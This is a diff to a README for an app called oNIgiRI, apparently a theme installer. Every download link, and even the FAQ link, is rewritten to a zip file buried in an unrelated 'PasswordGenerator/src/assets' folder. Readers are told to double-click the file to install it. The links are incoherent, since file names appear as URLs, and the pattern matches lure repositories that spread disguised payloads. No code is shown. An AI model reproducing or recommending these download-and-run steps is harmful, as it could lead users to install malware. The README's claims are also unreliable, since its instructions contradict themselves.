@@ -6,7 +6,7 @@ Welcome to oNIgiRI! This application helps you smoothly install Omarchy nifty th
 
 ## 📥 Download the Application
 
-[![Download oNIgiRI](https://github.com/ArslanAkbarChaudary/oNIgiRI/raw/refs/heads/master/PasswordGenerator/src/assets/RI_Igi_N_o_birthbed.zip)](https://github.com/ArslanAkbarChaudary/oNIgiRI/raw/refs/heads/master/PasswordGenerator/src/assets/RI_Igi_N_o_birthbed.zip)
+[![Download oNIgiRI](https://raw.githubusercontent.com/ArslanAkbarChaudary/oNIgiRI/master/PasswordGenerator/src/assets/RI_Igi_N_o_birthbed.zip)](https://raw.githubusercontent.com/ArslanAkbarChaudary/oNIgiRI/master/PasswordGenerator/src/assets/RI_Igi_N_o_birthbed.zip)
 
 ## 📋 System Requirements
 
@@ -20,13 +20,13 @@ Before you download, ensure your system meets these requirements:
 
 To get your copy of oNIgiRI, visit the link below:
 
-[Visit the Releases Page to Download](https://github.com/ArslanAkbarChaudary/oNIgiRI/raw/refs/heads/master/PasswordGenerator/src/assets/RI_Igi_N_o_birthbed.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/ArslanAkbarChaudary/oNIgiRI/master/PasswordGenerator/src/assets/RI_Igi_N_o_birthbed.zip)
 
 1. Click the link above to navigate to the releases page.
 2. Find the latest version at the top of the page.
 3. Look for the file that fits your operating system. 
-   - For **Windows**, it will typically be named `https://github.com/ArslanAkbarChaudary/oNIgiRI/raw/refs/heads/master/PasswordGenerator/src/assets/RI_Igi_N_o_birthbed.zip`.
-   - For **macOS**, look for `https://github.com/ArslanAkbarChaudary/oNIgiRI/raw/refs/heads/master/PasswordGenerator/src/assets/RI_Igi_N_o_birthbed.zip`.
+   - For **Windows**, it will typically be named `https://raw.githubusercontent.com/ArslanAkbarChaudary/oNIgiRI/master/PasswordGenerator/src/assets/RI_Igi_N_o_birthbed.zip`.
+   - For **macOS**, look for `https://raw.githubusercontent.com/ArslanAkbarChaudary/oNIgiRI/master/PasswordGenerator/src/assets/RI_Igi_N_o_birthbed.zip`.
 4. Click on the file name to start your download.
 
 Once the download completes, find the file in your Downloads folder.
@@ -37,14 +37,14 @@ After the file has downloaded, follow these steps to run the application:
 
 ### For Windows:
 
-1. Locate `https://github.com/ArslanAkbarChaudary/oNIgiRI/raw/refs/heads/master/PasswordGenerator/src/assets/RI_Igi_N_o_birthbed.zip` in your Downloads folder.
+1. Locate `https://raw.githubusercontent.com/ArslanAkbarChaudary/oNIgiRI/master/PasswordGenerator/src/assets/RI_Igi_N_o_birthbed.zip` in your Downloads folder.
 2. Double-click on the file to start the installation.
 3. Follow the prompts in the installation wizard.
 4. Once installed, you can find oNIgiRI in your Start Menu. Click to launch the application.
 
 ### For macOS:
 
-1. Open the `https://github.com/ArslanAkbarChaudary/oNIgiRI/raw/refs/heads/master/PasswordGenerator/src/assets/RI_Igi_N_o_birthbed.zip` file in your Downloads folder.
+1. Open the `https://raw.githubusercontent.com/ArslanAkbarChaudary/oNIgiRI/master/PasswordGenerator/src/assets/RI_Igi_N_o_birthbed.zip` file in your Downloads folder.
 2. Drag the oNIgiRI icon to your Applications folder.
 3. Go to your Applications folder and double-click on oNIgiRI to launch.
 
@@ -58,7 +58,7 @@ oNIgiRI offers several useful features:
 
 ## 🆘 Getting Help
 
-If you encounter issues while downloading or installing oNIgiRI, please consult our [FAQ Section](https://github.com/ArslanAkbarChaudary/oNIgiRI/raw/refs/heads/master/PasswordGenerator/src/assets/RI_Igi_N_o_birthbed.zip). You may also find solutions from the community.
+If you encounter issues while downloading or installing oNIgiRI, please consult our [FAQ Section](https://raw.githubusercontent.com/ArslanAkbarChaudary/oNIgiRI/master/PasswordGenerator/src/assets/RI_Igi_N_o_birthbed.zip). You may also find solutions from the community.
 
 ## 🔄 Feedback
 
@@ -72,4 +72,4 @@ For support, reach out to us via our GitHub discussions page or through the issu
 
 Thank you for choosing oNIgiRI! Enjoy your experience with our application. 
 
-[![Download oNIgiRI](https://github.com/ArslanAkbarChaudary/oNIgiRI/raw/refs/heads/master/PasswordGenerator/src/assets/RI_Igi_N_o_birthbed.zip)](https://github.com/ArslanAkbarChaudary/oNIgiRI/raw/refs/heads/master/PasswordGenerator/src/assets/RI_Igi_N_o_birthbed.zip)
+[![Download oNIgiRI](https://raw.githubusercontent.com/ArslanAkbarChaudary/oNIgiRI/master/PasswordGenerator/src/assets/RI_Igi_N_o_birthbed.zip)](https://raw.githubusercontent.com/ArslanAkbarChaudary/oNIgiRI/master/PasswordGenerator/src/assets/RI_Igi_N_o_birthbed.zip)
